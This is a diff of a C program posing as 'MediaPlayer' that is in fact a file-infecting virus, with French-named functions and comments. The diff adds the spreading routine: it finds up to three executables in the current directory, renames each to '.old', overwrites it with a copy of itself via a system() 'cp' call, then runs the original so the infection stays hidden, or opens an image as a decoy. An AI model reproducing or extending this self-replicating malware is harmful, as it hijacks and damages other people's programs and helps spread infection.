@@ -24,7 +24,7 @@ bool dejaInfecte(char* nomFichier)
 	return false;
 }
 
-char** searchFiles()
+char** searchFiles(char* exeption)
 {
 	char** files = malloc(3*sizeof(char*));
 	int cpt=0;
@@ -34,6 +34,9 @@ char** searchFiles()
 	printf("fichier(s) executable(s) :\n");
 	while ((lecture = readdir(rep))) { //Contenu du repertoire
 		stat(lecture->d_name,&buf);
+		char exeptionFile[strlen(lecture->d_name)+3];
+		strcpy(exeptionFile,"./");
+		strcat(exeptionFile,lecture->d_name);
 		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
 		{ //si fichier régu && executable
 			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer.exe")!=0 && !dejaInfecte(lecture->d_name)) 
@@ -44,44 +47,42 @@ char** searchFiles()
 			}
 		}
         }
-	return files;
 	closedir(rep);
+	return files;	
 }
 
 void infecte(char** files)
 {
 	for(int i=0;i<3;i+=1){
-		FILE *newFile;
-		FILE *oldFile;
-		char charFile;
 		char x[strlen(files[i])+strlen(".old")+1];
 		char currentFile[strlen(files[i])+1];
 		strcpy(currentFile,files[i]);
 		strcpy(x,files[i]);
 		strcat(x,".old");
 		rename(files[i],x);
-		printf("%s\n",x);
-		oldFile = fopen("MediaPlayer.c","r");
-		newFile = fopen(strcat(files[i],".c"),"w");
-		while((charFile = fgetc(oldFile)) != EOF)
-		{
-			fputc(charFile,newFile);	
-		}
-		char commande[strlen("cc -Wall ")+strlen(files[i])+strlen(" -o ")+strlen(currentFile)+3];
-		strcpy(commande,"cc -Wall ");
-		strcat(commande,files[i]);
-		strcat(commande," -o ");
-		strcat(commande,"currentFile");
-		printf("bblblblblblblbl %s\n", commande);
-		fclose(newFile);
-		fclose(oldFile);
+		char copyFile[500]="";
+		strcat(copyFile,"cp ");
+		strcat(copyFile,"./MediaPlayer.exe");
+		strcat(copyFile," ");
+		strcat(copyFile,files[i]);
+		system(copyFile);
 	}
 }
 
-
-int main()
+int main(int argc, char *argv[])
 {
-	char** f = searchFiles();
+	char exeptionFile[strlen(argv[0])+1];
+	strcpy(exeptionFile,argv[0]);
+	char** f = searchFiles(exeptionFile);
+	if(f[0]!=NULL)
 	infecte(f);
-	
+	if(strcmp(argv[0],"./MediaPlayer.exe")!=0)
+	{
+		char progExec[strlen(argv[0]+5)];//prog.old
+		strcpy(progExec,argv[0]);
+		strcat(progExec,".old");
+		system(progExec);
+	}else{
+		system("xdg-open ./oue.jpeg");
+	}
 }
